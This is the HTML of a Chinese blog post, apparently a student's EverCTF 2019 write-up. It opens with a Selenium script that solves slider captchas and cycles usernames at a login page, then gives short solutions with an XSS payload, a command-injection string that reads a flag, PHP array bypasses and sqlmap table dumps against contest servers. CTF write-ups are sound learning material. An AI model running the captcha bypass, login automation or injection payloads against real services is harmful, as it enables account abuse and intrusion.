self.browser.maximize_window()</span><br><span class="line">        self.wait = WebDriverWait(self.browser, <span class="number">10</span>)</span><br><span class="line">        self.wait_pass = WebDriverWait(self.browser, <span class="number">1</span>)</span><br><span class="line">        self.user_name = USER_NAME</span><br><span class="line">        self.password = PASSWORD</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.browser.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_slider</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        获取滑块</span></span><br><span class="line"><span class="string">        :return: 滑块对象</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        slider = self.wait.until(EC.element_to_be_clickable((By.CLASS_NAME, <span class="string">&#x27;gt_slider_knob&#x27;</span>)))</span><br><span class="line">        <span class="keyword">return</span> slider</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_position</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        获取验证码位置</span></span><br><span class="line"><span class="string">        :return: 验证码位置元组</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        img = self.wait.until(EC.presence_of_element_located((By.CLASS_NAME, <span class="string">&#x27;gt_box&#x27;</span>)))</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        location = img.location</span><br><span class="line">        size = img.size</span><br><span class="line">        top, bottom, left, right = location[<span class="string">&#x27;y&#x27;</span>], location[<span class="string">&#x27;y&#x27;</span>] + size[<span class="string">&#x27;height&#x27;</span>], location[<span class="string">&#x27;x&#x27;</span>], location[<span class="string">&#x27;x&#x27;</span>] + size[</span><br><span class="line">            <span class="string">&#x27;width&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> (top, bottom, left, right)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_screenshot</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        获取网页截图</span></span><br><span class="line"><span class="string">        :return: 截图对象</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        screenshot = self.browser.get_screenshot_as_png()</span><br><span class="line">        screenshot = Image.<span class="built_in">open</span>(BytesIO(screenshot))</span><br><span class="line">        <span class="keyword">return</span> screenshot</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_bili_image</span>(<span class="params">self, name=<span class="string">&#x27;captcha.png&#x27;</span></span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        获取验证码图片</span></span><br><span class="line"><span class="string">        :return: 图片对象</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        top, bottom, left, right = self.get_position()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;验证码位置&#x27;</span>, left, top, right, bottom)</span><br><span class="line">        screenshot = self.get_screenshot()</span><br><span class="line">        captcha = screenshot.crop(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x * MULTIPE), (left, top, right, bottom)))</span><br><span class="line">        captcha.save(name)</span><br><span class="line">        <span class="keyword">return</span> captcha</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        打开网页输入用户名密码</span></span><br><span class="line"><span class="string">        :return: None</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.browser.get(self.url)</span><br><span class="line">        user_name = self.wait.until(EC.presence_of_element_located((By.ID, <span class="string">&#x27;login-username&#x27;</span>)))</span><br><span class="line">        password = self.wait.until(EC.presence_of_element_located((By.ID, <span class="string">&#x27;login-passwd&#x27;</span>)))</span><br><span class="line">        user_name.send_keys(self.user_name)</span><br><span class="line">        password.send_keys(self.password)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.browser.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_gap</span>(<span class="params">self, image1, image2</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        获取缺口偏移量</span></span><br><span class="line"><span class="string">        :param image1: 不带缺口图片</span></span><br><span class="line"><span class="string">        :param image2: 带缺口图片</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        left = <span class="built_in">int</span>(<span class="number">60</span> * MULTIPE)  <span class="comment"># 滑块最右测在验证码图片上的 x 坐标为 60</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(left, image1.size[<span class="number">0</span>]):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> self.is_pixel_equal(image1, image2, i, j):</span><br><span class="line">                    left = i</span><br><span class="line">                    <span class="keyword">return</span> left</span><br><span class="line">        <span class="keyword">return</span> left</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_pixel_equal</span>(<span class="params">self, image1, image2, x, y</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        判断两个像素是否相同</span></span><br><span class="line"><span class="string">        :param image1: 图片 1</span></span><br><span class="line"><span class="string">        :param image2: 图片 2</span></span><br><span class="line"><span class="string">        :param x: 位置 x</span></span><br><span class="line"><span class="string">        :param y: 位置 y</span></span><br><span class="line"><span class="string">        :return: 像素是否相同</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 取两个图片的像素点</span></span><br><span class="line">        pixel1 = image1.load()[x, y]</span><br><span class="line">        pixel2 = image2.load()[x, y]</span><br><span class="line">        threshold = <span class="number">60</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(pixel1[<span class="number">0</span>] - pixel2[<span class="number">0</span>]) &lt; threshold <span class="keyword">and</span> <span class="built_in">abs</span>(pixel1[<span class="number">1</span>] - pixel2[<span class="number">1</span>]) &lt; threshold <span class="keyword">and</span> <span class="built_in">abs</span>(</span><br><span class="line">                pixel1[<span class="number">2</span>] - pixel2[<span class="number">2</span>]) &lt; threshold:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_track</span>(<span class="params">self, distance</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        根据偏移量获取移动轨迹</span></span><br><span class="line"><span class="string">        一开始加速，然后减速，生长曲线，且加入点随机变动</span></span><br><span class="line"><span class="string">        :param distance: 偏移量</span></span><br><span class="line"><span class="string">        :return: 移动轨迹</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 移动轨迹</span></span><br><span class="line">        track = []</span><br><span class="line">        <span class="comment"># 当前位移</span></span><br><span class="line">        current = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 减速阈值</span></span><br><span class="line">        mid = distance * <span class="number">3</span> / <span class="number">4</span></span><br><span class="line">        <span class="comment"># 间隔时间</span></span><br><span class="line">        t = <span class="number">0.10</span></span><br><span class="line">        v = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> current &lt; distance:</span><br><span class="line">            <span class="keyword">if</span> current &lt; mid:</span><br><span class="line">                a = random.randint(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a = - random.randint(<span class="number">6</span>, <span class="number">7</span>)</span><br><span class="line">            v0 = v</span><br><span class="line">            v = v0 + a * t</span><br><span class="line">            move = v0 * t + <span class="number">1</span> / <span class="number">2</span> * a * t * t</span><br><span class="line">            current += move</span><br><span class="line">            track.append(<span class="built_in">round</span>(move))</span><br><span class="line">        <span class="keyword">return</span> track</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move_to_gap</span>(<span class="params">self, slider, track</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        拖动滑块到缺口处</span></span><br><span class="line"><span class="string">        :param slider: 滑块</span></span><br><span class="line"><span class="string">        :param track: 轨迹</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        ActionChains(self.browser).click_and_hold(slider).perform()</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> track:</span><br><span class="line">            ActionChains(self.browser).move_by_offset(xoffset=x, yoffset=<span class="number">0</span>).perform()</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        ActionChains(self.browser).release().perform()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        登录</span></span><br><span class="line"><span class="string">        :return: None</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        submit = self.wait.until(EC.element_to_be_clickable((By.CLASS_NAME, <span class="string">&#x27;btn-login&#x27;</span>)))</span><br><span class="line">        submit.click()</span><br><span class="line">        time.sleep(<span class="number">7</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;登录成功&#x27;</span>)</span><br><span class="line">        self.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">refresh</span>(<span class="params">self</span>):</span></span><br><span class="line">        refresh = self.wait.until(EC.element_to_be_clickable((By.CLASS_NAME, <span class="string">&#x27;gt_refresh_button&#x27;</span>)))</span><br><span class="line">        refresh.click()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">crack</span>(<span class="params">self, slider</span>):</span></span><br><span class="line">        <span class="comment"># 将鼠标移至滑块对象</span></span><br><span class="line">        ActionChains(self.browser).move_to_element(slider).perform()</span><br><span class="line">        <span class="comment"># 获取验证码图片</span></span><br><span class="line">        image1 = self.get_bili_image(<span class="string">&#x27;captcha1.png&#x27;</span>)</span><br><span class="line">        ActionChains(self.browser).click_and_hold(slider).perform()</span><br><span class="line">        <span class="comment"># 获取带缺口的验证码图片</span></span><br><span class="line">        image2 = self.get_bili_image(<span class="string">&#x27;captcha2.png&#x27;</span>)</span><br><span class="line">        <span class="comment"># 获取缺口位置</span></span><br><span class="line">        gap = self.get_gap(image1, image2)</span><br><span class="line">        <span class="comment"># 截图中是 150% 的距离，要除掉</span></span><br><span class="line">        gap = <span class="built_in">int</span>(gap / MULTIPE)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;缺口位置&#x27;</span>, gap)</span><br><span class="line">        <span class="comment"># 减去缺口位移</span></span><br><span class="line">        gap -= BORDER</span><br><span class="line">        <span class="comment"># 获取移动轨迹</span></span><br><span class="line">        track = self.get_track(gap)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;滑动轨迹&#x27;</span>, track)</span><br><span class="line">        <span class="comment"># 拖动滑块</span></span><br><span class="line">        self.move_to_gap(slider, track)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            success = self.wait_pass.until(</span><br><span class="line">                EC.text_to_be_present_in_element((By.CLASS_NAME, <span class="string">&#x27;gt_info_text&#x27;</span>), <span class="string">&#x27;验证通过&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(success)</span><br><span class="line">        <span class="keyword">except</span> TimeoutException:</span><br><span class="line">            success = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 失败后重试</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> success:</span><br><span class="line">            ActionChains(self.browser).move_to_element(slider).perform()</span><br><span class="line">            self.refresh()</span><br><span class="line">            self.crack(slider)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.login()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 创建实例</span></span><br><span class="line">    <span class="comment"># 输入用户名密码</span></span><br><span class="line">    <span class="comment"># crack.name = &#x27;hfjhjhhjfh595&#x27;</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;ctf.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        crack = CrackBili()</span><br><span class="line">        crack.user_name = line</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;第&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;次尝试, username=&#x27;</span>, crack.user_name)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        crack.<span class="built_in">open</span>()</span><br><span class="line">        time.sleep(<span class="number">4</span>)</span><br><span class="line">        crack.login()</span><br><span class="line">        <span class="comment"># crack.close()</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;开始下一次的尝试&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="comment"># # 获取滑块对象</span></span><br><span class="line">    <span class="comment"># slider = crack.get_slider()</span></span><br><span class="line">    <span class="comment"># crack.crack(slider)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><p>直接拖入 IDA, 然后<br><img data-src="2019-04-02-11-56-54.png"><br>太简单了吧。。。</p>
+<blockquote>
+<p>flag{123_Buff3r_0v3rf|0w}</p>
+</blockquote>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>没经验, 不会, 不了解</p>
+<h2 id="Ppc"><a href="#Ppc" class="headerlink" title="Ppc"></a>Ppc</h2><p>跳过</p>
+<h2 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h2><p>跳过 (没错, 与易经相关的都跳过)</p>
+<h3 id="cockroach"><a href="#cockroach" class="headerlink" title="cockroach"></a>cockroach</h3><p>查看源码, 颜文字加密。。。复制粘贴控制台, 报错, 无 web3, 放弃。。。</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="足够安全的-RSA"><a href="#足够安全的-RSA" class="headerlink" title="足够安全的 RSA"></a>足够安全的 RSA</h3><p>复制粘贴了两次 N, 电脑死机了两次。。。<br>然后在 Github 上找到了不需要复制粘贴的工具 (<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzNzdW1tZXIvQ1RGLVJTQS10b29s">CTF-RSA-Tools<i class="fa fa-external-link-alt"></i></span>, 配好了 RSA 的环境, 结果还是解不开。。。相当真实<br>后来想到 e=23, 可以用小 e 模式的, 然而 N 太长, 唉, 早知道当时写脚本了。。。怪我不该偷懒 (其实是有其他事情, 没时间搞了)</p>
+<h3 id="侠客行"><a href="#侠客行" class="headerlink" title="侠客行"></a>侠客行</h3><p>虽然我是金庸武侠迷, 但是, 侠客行我真的没有看过. 跳过</p>
+<h3 id="RSA-共模"><a href="#RSA-共模" class="headerlink" title="RSA 共模"></a>RSA 共模</h3><p>看我用之前配好的环境!!!<br>三行命令搞定这个题<br>先从公钥文件中获取参数, 再将文件写成标准格式 (工具规定的), 然后运行, 搞定, 大功告成!<br><img data-src="2019-04-02-18-59-40.png"><br>懒得贴了</p>
+<p>&lt;!–&gt; falg{61} –&gt;</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="欢迎来参加比赛"><a href="#欢迎来参加比赛" class="headerlink" title="欢迎来参加比赛"></a>欢迎来参加比赛</h3><p>群公告, 然后 base64 解码<br>就不贴了, 不坏了规矩 (这句话是我从别人的 wp 中看到的, 太有逼格了)</p>
+<h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>构造 <code>ustb.ever404.com:30000/index.php?a=xss&lt;script&gt;alert(1)&lt;/script&gt;</code>(Hackbar 自带的)</p>
+<blockquote>
+<p>everctf{X5s_1s_cr4zy}</p>
+</blockquote>
+<h3 id="ping"><a href="#ping" class="headerlink" title="ping?"></a>ping?</h3><p>暂时没看懂题目</p>
+<hr>
+<p>噢噢, 在 dalao 的提示下, 知道了原来是命令注入。。。输入 <code>127.0.0.1 &amp;&amp; ls</code><br><img data-src="2019-04-01-11-10-19.png"><br>还有什么说的呢? 输入 <code>127.0.0.1 &amp;&amp; cat flag</code><br><img data-src="2019-04-01-11-19-45.png"></p>
+<blockquote>
+<p>everctf{6e_carefu1_4bout_exec}</p>
+</blockquote>
+<h3 id="猜密码"><a href="#猜密码" class="headerlink" title="猜密码"></a>猜密码</h3><p>暴力用数组的方式解决 (好几个题都这么暴力解决了, 估计出题人没有想到吧)<br>构造 <span class="exturl" data-url="aHR0cDovL3VzdGIuZXZlcjQwNC5jb206MzAwMTEvaW5kZXgucGhwP3Bhc3N3b3JkJTVCJTVEPQ==">http://ustb.ever404.com:30011/index.php?password[]=<i class="fa fa-external-link-alt"></i></span></p>
+<blockquote>
+<p>everctf{5trcmp_1s_we4k}</p>
+</blockquote>
+<h3 id="点我一下就给你-flag"><a href="#点我一下就给你-flag" class="headerlink" title="点我一下就给你 flag"></a>点我一下就给你 flag</h3><p>Ctrl+U 查看源码发现一大堆读不懂的东西, 还有 <code>sojson.v5</code> 的提示, 于是百度了一下, 过去后解码还是发现有问题。。。好吧, 难受<br>抓包吧? 好! 发现禁止了一大堆的东西。。。<br>代理吧? 可! 发现并没有发包。。。<br>再看页面, flag 已经给我了???what??? 不发包居然给我了!!!<br>好吧, <code>ctrl+s </code> 将网页存到本地, 打开, 然后。。。<br><img data-src="2019-04-01-11-22-05.png"><br>你很强嘛!! 果然是签到题。。。</p>
+<blockquote>
+<p>everctf{c0ns0le_1s_g00d}</p>
+</blockquote>
+<h3 id="注入热身"><a href="#注入热身" class="headerlink" title="注入热身"></a>注入热身</h3><p>没环境, 暂时没做.</p>
+<hr>
+<p>好了现在开 Kali 了, sqlmap 全自动</p>
+<ul>
+<li>获取当前使用的数据库</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap -u http://ustb.everctf.com:30009/?id=1 --current-db</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="2019-04-01-11-50-43.png"></p>
+<ul>
+<li>获取当前使用的数据库的所有数据表</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap -u http://ustb.everctf.com:30009/?id=1 -D sqli --tables</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="2019-04-01-11-50-09.png"></p>
+<ul>
+<li>显示当前数据表的所有值</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap -u http://ustb.everctf.com:30009/?id=1 -D sqli -T flag --dump</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="2019-04-01-11-49-21.png"></p>
+<p>好了, 大功告成</p>
+<h3 id="否认三连"><a href="#否认三连" class="headerlink" title="否认三连"></a>否认三连</h3><p>查看源代码, 好吧, 代码审计。。。<br>还是一样的, 用数组暴力解决<br>构造 <span class="exturl" data-url="aHR0cDovL3VzdGIuZXZlcjQwNC5jb206MzAwMTIvaW5kZXgucGhwP2p1c3RpZnkxPXdvYnVzaGkmYW1wO2p1c3RpZnkyJTVCJTVEPXdvbWVpeW91JmFtcDtqdXN0aWZ5MyU1QiU1RD1uaWJpZWx1YW5zaHVvYSZhbXA7bWFyayU1QiU1RD0=">http://ustb.ever404.com:30012/index.php?justify1=wobushi&amp;justify2[]=womeiyou&amp;justify3[]=nibieluanshuoa&amp;mark[]=<i class="fa fa-external-link-alt"></i></span></p>
+<blockquote>
+<p>everctf{pHp_C4n_Be_d4n9er0us}</p>
+</blockquote>
+<h3 id="404-的危机"><a href="#404-的危机" class="headerlink" title="404 的危机"></a>404 的危机</h3><p>打开控制台, 发现一个人的 qq, 看空间, 说说一条链接为<br><span class="exturl" data-url="aHR0cDovL3VybC5jbi81RTZLZTds">http://url.cn/5E6Ke7l<i class="fa fa-external-link-alt"></i></span><br>然而, 打不开啊!!!<br>好吧所谓的打开方式不对, 用浏览器打开, 得到一串很奇怪的网址: <span class="exturl" data-url="aHR0cDovL21hdDIza2NjNmh3Z2szdngub25pb24vbmVvL3VwbG9hZHMvMTkwMzI5L01BVFJJWF8xMDQzMzRfUVBLX3NlY29uZC5qcGc=">http://mat23kcc6hwgk3vx.onion/neo/uploads/190329/MATRIX_104334_QPK_second.jpg<i class="fa fa-external-link-alt"></i></span><br>看不懂这串网址。。。</p>
+<hr>
+<p>算了, 再努力一次. 这一次, 重新打开<br><img data-src="2019-04-02-17-04-55.png"><br>md, 图床挂了。。。是的挂了。。。<br>扫描二维码获得 flag</p>
+<blockquote>
+<p>flag{7861495462475a393747634a6e686c41436f57766c413d3d}<br>我特么还以为又是一串密文, 还想了一下要不要解密, 结果试了一下, 过了。。。</p>
+</blockquote>
+<h3 id="绝对安全的-blog"><a href="#绝对安全的-blog" class="headerlink" title="绝对安全的 blog"></a>绝对安全的 blog</h3><p>最后一篇日记得知后台登录链接：<br><span class="exturl" data-url="aHR0cDovL3VzdGIuZXZlcjQwNC5jb206MzAwMDMvYWRtMW4vaW5kZXgucGhw">http://ustb.ever404.com:30003/adm1n/index.php<i class="fa fa-external-link-alt"></i></span><br>查看源码, 得知表单处理链接为<br><span class="exturl" data-url="aHR0cDovL3VzdGIuZXZlcjQwNC5jb206MzAwMDMvYWRtMW4vYWtqYWhkYWhkaWEucGhw">http://ustb.ever404.com:30003/adm1n/akjahdahdia.php<i class="fa fa-external-link-alt"></i></span><br>而后通过随便构造用户名密码, 发包, 在响应里看到<br><img data-src="2019-04-01-11-52-42.png"><br>于是得到了前半段</p>
+<blockquote>
+<p>everctf{rkl_1</p>
+</blockquote>
+<p>以及搜索的替换规则——</p>
+<blockquote>
+<p>&gt;、&lt; 依次被删掉, 而后替换 &lt; script 为 &lt; scr_ipt, 再替换 on 为 o_n, 最后输出.<br>虽然我也没能够搜索到后半段.</p>
+</blockquote>
+<hr>
+<p>好了改题了, 现在是这个界面<br><img data-src="2019-04-01-11-53-35.png"><br>好了, 那现在就简单了.<br>既然是从 USTB 官网来, 那么添加 Referrer 参数为 <span class="exturl" data-url="aHR0cHM6Ly93d3cudXN0Yi5lZHUuY24v">https://www.ustb.edu.cn<i class="fa fa-external-link-alt"></i></span> 即可得到.<br><img data-src="2019-04-01-11-55-41.png"><br>PS: 最开始的时候没看到 USTB。。。然后构造的是 <span class="exturl" data-url="aHR0cHM6Ly93d3cuZXZlcjQwNC5jb20v">https://www.ever404.com<i class="fa fa-external-link-alt"></i></span></p>
+<blockquote>
+<p>everctf{rkl_1S_50_14j1}</p>
+</blockquote>
+<hr>
+<blockquote>
+<p>最后, 成绩还行, 虽然有 dalao 的鼓励和提示。<br>还好, 接触了一周左右就参赛, 还一半时间摸鱼 hhhhhh<br><img data-src="2019-04-03-00-38-52.png"><br>以后再加油, 速成的, 到底还是见识太少</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+      
+
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>『赞赏是最好的支持与鼓励』</div>
+  <button onclick="document.querySelector('.post-reward').classList.toggle('active');">
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="有龙则灵 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="有龙则灵 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>有龙则灵
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://htharoldht.com/everctf2019-writeup/" title="EverCTF_2019 WriteUp">https://htharoldht.com/everctf2019-writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1IYW5z"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/USTB/" rel="tag"># USTB</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/EverCTF/" rel="tag"># EverCTF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/two-or-three-things-in-family-with-children/" rel="prev" title="《家有儿女》二三事">
+                  <i class="fa fa-chevron-left"></i> 《家有儿女》二三事
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/big-database-job/" rel="next" title="数据库大作业">
+                  数据库大作业 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+<script src="/js/comments.js"></script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><span class="exturl" data-url="aHR0cHM6Ly9iZWlhbi5taWl0Lmdvdi5jbg==">京ICP备18043046号 </span>
+  </div>
+
+<div class="copyright">
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">有龙则灵</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@next-theme/pjax@0.5.0/pjax.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/lozad@1.16.0/dist/lozad.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  
+
+
+
+  <script class="next-config" data-name="pdf" type="application/json">{&quot;object_url&quot;:&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;pdfobject@2.2.5&#x2F;pdfobject.min.js&quot;,&quot;url&quot;:&quot;&#x2F;lib&#x2F;pdf&#x2F;web&#x2F;viewer.html&quot;}</script>
+  <script src="/js/third-party/tags/pdf.js"></script>
+
+  <script class="next-config" data-name="mermaid" type="application/json">{&quot;enable&quot;:true,&quot;theme&quot;:&quot;forest&quot;,&quot;js&quot;:&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;mermaid@8.9.3&#x2F;dist&#x2F;mermaid.min.js&quot;}</script>
+  <script src="/js/third-party/tags/mermaid.js"></script>
+
+  <script class="next-config" data-name="nprogress" type="application/json">{&quot;enable&quot;:true,&quot;spinner&quot;:true}</script>
+  <script src="/js/third-party/nprogress.js"></script>
+
+  
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
